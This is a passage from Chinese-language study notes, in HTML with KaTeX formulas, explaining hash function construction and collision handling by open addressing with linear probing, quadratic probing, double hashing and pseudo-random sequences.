<p><strong>数字分析法</strong></p>
<p>设关键字是 <code>r</code> 进制数（如十进制数），而 <code>r</code> 个数码在各位上出现的频率不一定相同，可能在某些位上分布均匀一些，每种数码出现的机会均等；而在某些位上分布不均匀，只有某几种数码经常出现，此时应选取数码分布较为均匀的若干位作为散列地址。这种方法适合于已知的关键字集合，若更换了关键字，则需要重新构造新的散列函数。</p>
</li>
<li>
<p><strong>平方取中法</strong></p>
<p>顾名思义，这种方法取关键字的平方值的中间几位作为散列地址。具体取多少位要视实际情况而定。这种方法得到的散列地址与关键字的每位都有关系，因此使得散列地址分布比较均匀，适用于关键字的每位取值都不够均匀或均小于散列地址所需的位数。</p>
<p>在不同的情况下，不同的散列函数具有不同的性能，因此不能笼统地说哪种散列函数最好。在实际选择中，采用何种构造散列函数的方法取决于关键字集合的情况，但目标是尽量降低产生冲突的可能性。</p>
</li>
</ol>
<h4> 处理冲突的方法</h4>
<p>应该注意到，任何设计出来的散列函数都不可能绝对地避免冲突。为此，必须考虑在发生冲突时应该如何处理，即为产生冲突的关键字寻找下一个 “空” 的 <code>Hash</code> 地址。用 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>H</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">H_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 表示处理冲突中第 <code>i</code> 次探测得到的散列地址，假设得到的另一个散列地址 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>H</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">H_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 仍然发生冲突，只得继续求下一个地址 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>H</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">H_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，以此类推，直到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>H</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">H_{k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 不发生冲突为止，则 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>H</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">H_{k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 为关键字在表中的地址。</p>
<ol>
<li>
<p><strong>开放定址法</strong></p>
<p>所谓开放定址法，是指可存放新表项的空闲地址既向它的同义词表项开放，又向它的非同义词表项开放。其数学递推公式为：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>H</mi><mi>i</mi></msub><mo>=</mo><mo stretchy="false">(</mo><mi>H</mi><mo stretchy="false">(</mo><mi>k</mi><mi>e</mi><mi>y</mi><mo stretchy="false">)</mo><mo>+</mo><msub><mi>d</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mi mathvariant="normal">%</mi><mi>m</mi></mrow><annotation encoding="application/x-tex">H_{i} = (H(key) + d_{i}) \% m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.03588em;">ey</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord">%</span><span class="mord mathnormal">m</span></span></span></span> 式中，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>k</mi><mi>e</mi><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">H(key)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.03588em;">ey</span><span class="mclose">)</span></span></span></span> 为散列函数；<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>=</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><mi>k</mi><mo stretchy="false">(</mo><mi>k</mi><mo>⩽</mo><mi>m</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">i = 0, 1, 2, \dotsc, k(k \leqslant m - 1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>；<code>m</code> 表示散列表表长；<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">d_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 为增量序列。</p>
<p>取定某一增量序列后，对应的处理方法就是确定的。<strong>通常有以下四种取法：</strong></p>
<ul>
<li>
<p><strong>线性探测法</strong>：当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mi>i</mi></msub><mo>=</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><mi>m</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">d_{i} = 0, 1, 2, \dotsc, m - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 时，称为 <strong>线性探测法</strong>。这种方法的 <strong>特点是</strong>：冲突发生时，顺序查看表中下一个单元（探测到表尾地址 <code>m - 1</code> 时，下一个探测地址是表首地址 <code>0</code>），直到找出一个空闲单元（当表未填满时一定能找到一个空闲单元）或查遍全表。</p>
<p>线性探测法可能使第 <code>i</code> 个散列地址的同义词存入第 <code>i + 1</code> 个散列地址，这样本应存入第 <code>i + 1</code> 个散列地址的元素就争夺第 <code>i + 2</code> 个散列地址的元素的地址……从而造成大量元素在相邻的散列地址上 “聚集”（或堆积）起来，大大降低了查找效率。</p>
</li>
<li>
<p><strong>平方探测法</strong>：当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mi>i</mi></msub><mo>=</mo><msup><mn>0</mn><mn>2</mn></msup><mo separator="true">,</mo><msup><mn>1</mn><mn>2</mn></msup><mo separator="true">,</mo><mo>−</mo><msup><mn>1</mn><mn>2</mn></msup><mo separator="true">,</mo><msup><mn>2</mn><mn>2</mn></msup><mo separator="true">,</mo><mo>−</mo><msup><mn>2</mn><mn>2</mn></msup><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msup><mi>k</mi><mn>2</mn></msup><mo separator="true">,</mo><mo>−</mo><msup><mi>k</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">d_{i} = 0^{2}, 1^{2}, -1^{2}, 2^{2}, -2^{2}, ..., k^{2}, -k^{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0085em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">−</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">...</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">−</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span> 时，称为 <strong>平方探测法</strong>，其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>⩽</mo><mi>m</mi><mi mathvariant="normal">/</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">k \leqslant m / 2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8311em;vertical-align:-0.1367em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mord">/2</span></span></span></span>，散列表长度 <code>m</code> 必须是一个可以表示成 <code>4k + 3</code> 的素数，又称 <strong>二次探测法</strong>。</p>
<p>平方探测法是一种处理冲突的较好方法，可以避免出现 “堆积” 问题，它的缺点是不能探测到散列表上的所有单元，但至少能探测到一半单元。</p>
</li>
<li>
<p><strong>双散列法</strong>：当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mi>i</mi></msub><mo>=</mo><mi>H</mi><mi>a</mi><mi>s</mi><msub><mi>h</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>k</mi><mi>e</mi><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">d_{i} = Hash_{2} (key)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.03588em;">ey</span><span class="mclose">)</span></span></span></span> 时，称为 <strong>双散列法</strong>。需要使用两个散列函数，当通过第一个散列函数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>k</mi><mi>e</mi><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">H(key)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.03588em;">ey</span><span class="mclose">)</span></span></span></span> 得到的地址发生冲突时，则利用第二个散列函数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mi>a</mi><mi>s</mi><mi>h</mi><mn>2</mn><mo stretchy="false">(</mo><mi>k</mi><mi>e</mi><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Hash2(key)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">h</span><span class="mord">2</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.03588em;">ey</span><span class="mclose">)</span></span></span></span> 计算该关键字的地址增量。它的具体散列函数形式如下：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>H</mi><mi>i</mi></msub><mo>=</mo><mo stretchy="false">(</mo><mi>H</mi><mo stretchy="false">(</mo><mi>k</mi><mi>e</mi><mi>y</mi><mo stretchy="false">)</mo><mo>+</mo><mi>i</mi><mo>×</mo><mi>H</mi><mi>a</mi><mi>s</mi><msub><mi>h</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>k</mi><mi>e</mi><mi>y</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mi mathvariant="normal">%</mi><mi>m</mi></mrow><annotation encoding="application/x-tex">H_{i} = (H(key) + i \times Hash_{2} (key)) \% m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.03588em;">ey</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7429em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.03588em;">ey</span><span class="mclose">))</span><span class="mord">%</span><span class="mord mathnormal">m</span></span></span></span> 初始探测位置 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>H</mi><mn>0</mn></msub><mo>=</mo><mi>H</mi><mo stretchy="false">(</mo><mi>k</mi><mi>e</mi><mi>y</mi><mo stretchy="false">)</mo><mi mathvariant="normal">%</mi><mi>m</mi></mrow><annotation encoding="application/x-tex">H_{0} = H(key) \% m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.03588em;">ey</span><span class="mclose">)</span><span class="mord">%</span><span class="mord mathnormal">m</span></span></span></span>。<code>i</code> 是冲突的次数，初始为 <code>0</code>。在双散列法中，最多经过 <code>m - 1</code> 次探测就会遍历表中所有位置，回到位置。</p>
</li>
<li>
<p><strong>伪随机序列法</strong>：当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mi>i</mi></msub><mo>=</mo></mrow><annotation encoding="application/x-tex">d_{i} =</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span></span></span></span> 伪随机数序列时，称为 <strong>伪随机序列法。</strong></p>
</li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
